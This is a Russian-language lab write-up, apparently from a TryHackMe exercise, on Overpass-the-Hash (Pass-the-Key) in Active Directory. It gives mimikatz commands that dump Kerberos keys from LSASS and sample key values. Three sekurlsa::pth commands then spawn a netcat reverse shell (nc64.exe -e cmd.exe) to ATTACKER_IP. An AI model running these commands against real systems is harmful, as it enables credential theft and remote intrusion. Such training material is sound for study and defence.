# Отчёт: Overpass-the-Hash (Pass-the-Key)

## Описание атаки

Overpass-the-Hash (также известен как Pass-the-Key) — использование Kerberos ключей (RC4, AES128, AES256) для запроса TGT без знания пароля.

### Ты используешь не пароль, а его RC4 или другой ключ для аутентификации. Это позволяет запускать процессы от имени пользователя, даже не зная его пароля.

## Как это работает

1. При запросе TGT клиент отправляет timestamp, зашифрованный ключом из пароля
2. Алгоритмы: RC4, AES128, AES256 (DES отключён)
3. Если у нас есть ключ, мы можем запросить TGT от имени пользователя

## Где взять ключи

**Требуемые права:** Administrator (SYSTEM)

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys (Извлекает из памяти LSASS все Kerberos ключи (RC4, AES128, AES256) для пользователей, у которых есть активные сессии на машине)
```

### Что получаем: Ключ (например, RC4) пользователя t1_toby.beck. Это как цифровой отпечаток его пароля. Сам пароль ты не знаешь, но ключ у тебя есть.
### Почему это работает: Пользователь t1_toby.beck когда-то логинился на THMJMP2, и его ключи остались в памяти.

Пример вывода:
- RC4: `96ea24eff4dff1fbe13818fbf12ea7d8`
- AES128: `b65ea8151f13a31d01377f5934bf3883`
- AES256: `b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65`

## Pass-the-Key (reverse shell)

**Требуемые права:** не требуются для запуска процесса, ключ уже есть

### С RC4 ключом (он же NTLM хэш)

```cmd
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

### С AES128 ключом

```cmd
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

### С AES256 ключом

```cmd
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

# Что происходит под капотом:

# 1. Mimikatz создаёт новый процесс nc64.exe

# 2. Этот процесс запускается от имени пользователя t1_toby.beck (используя его RC4 ключ)

# 3. nc64.exe подключается к твоей Kali на порт 5556 и передаёт ей командную оболочку (cmd.exe)


## Важные замечания

- При использовании RC4 ключ равен NTLM хэшу — это называется Overpass-the-Hash
- Даже если `whoami` показывает другого пользователя, команды будут выполняться от имени внедрённого пользователя
- После внедрения можно использовать winrs, psexec, xfreerdp без указания пароля


